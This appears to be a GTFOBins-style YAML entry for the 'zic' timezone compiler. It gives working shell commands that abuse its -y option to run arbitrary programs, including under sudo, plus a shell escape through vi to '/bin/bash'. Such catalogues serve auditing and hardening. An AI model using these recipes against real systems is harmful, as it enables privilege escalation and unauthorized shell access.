---
functions:
  command:
    - description: |
        This executes system(''id' 0 'arg2''), and system(''id' 1 'arg2'').
        You can also pass negative numbers, so the resulting command would look like system(''id' -1 'arg2'').
    - code: |
        echo "Rule    Jordan  0     1     arg2              Jan     lastSun       2       1:00d   -" > zicfile
        echo "Zone    Test    2:00    Jordan  CE%sT" >> zicfile
        zic -d . -y "id" ./zicfile
  sudo:
    - code: |
        echo "Rule    Jordan  0     1     arg2              Jan     lastSun       2       1:00d   -" > zicfile
        echo "Zone    Test    2:00    Jordan  CE%sT" >> zicfile
        zic -d . -y "id" ./zicfile
  shell:
    - code: |
        echo "Rule    Jordan  0     1     arg2              Jan     lastSun       2       1:00d   -" > zicfile
        echo "Zone    Test    2:00    Jordan  CE%sT" >> zicfile
        zic -d . -y "vi" ./zicfile
        :!/bin/bash
---
